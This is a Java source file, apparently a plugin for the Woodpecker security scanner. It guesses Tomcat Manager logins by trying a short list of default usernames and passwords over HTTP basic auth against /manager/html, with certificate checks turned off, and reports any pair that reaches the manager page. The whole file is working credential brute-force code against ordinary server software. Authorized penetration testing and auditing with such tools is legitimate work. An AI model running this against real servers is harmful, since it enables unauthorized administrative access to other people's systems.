package me.gv7.woodpecker.vuldb.weak_password.poc;

import me.gv7.woodpecker.plugin.IPoc;
import me.gv7.woodpecker.plugin.IResultOutput;
import me.gv7.woodpecker.plugin.IScanResult;
import me.gv7.woodpecker.plugin.ITarget;
import me.gv7.woodpecker.vuldb.weak_password.WeakPasswordCrackPlugin;
import net.dongliu.requests.RawResponse;
import net.dongliu.requests.Requests;

public class WeakPasswordCrackPoc implements IPoc {
    String[] flag_array = new String[]{"/manager/html/reload", "Tomcat Web Application Manager"};
    String[] user_array = new String[]{"admin", "manager", "tomcat", "apache", "root"};
    String[] pass_array = new String[]{"admin", "manager", "tomcat", "apache", "root"};

    public IScanResult doCheck(ITarget target, IResultOutput iResultOutput) {
        IScanResult scanResult = WeakPasswordCrackPlugin.pluginHelper.createScanResult();
        String vulURL = target.getRootAddress() + "/manager/html";

        for(String username:user_array){
            for(String password:pass_array){
                RawResponse response = Requests.get(vulURL).basicAuth(username, password).verify(false).send();
                if(response.getStatusCode() == 404){
                    String msg = String.format("%s is 404",vulURL);
                    scanResult.setExists(false);
                    scanResult.setMsg(msg);
                    iResultOutput.infoPrintln(msg);
                    return scanResult;
                }else if(response.getStatusCode() == 401 || response.getStatusCode() == 403){
                    String msg = String.format("username:[%s],password:[%s] error status:[%d]",username,password,response.getStatusCode());
                    iResultOutput.infoPrintln(msg);
                    continue;
                }else{
                    String respBody = response.readToText();
                    // 判断返回内容是否有关键字
                    for(String flag:flag_array){
                        if(respBody.contains(flag)){
                            String msg = String.format("username:[%s],password:[%s],response include flag:[%s]",username,password,flag);
                            scanResult.setExists(true);
                            scanResult.setMsg(msg);
                            iResultOutput.infoPrintln(msg);
                            return scanResult;
                        }else{
                            String msg = String.format("username:[%s],password:[%s],response not include flag",username,password);
                            iResultOutput.infoPrintln(msg);
                        }
                    }
                }
            }
        }
        return scanResult;
    }
}
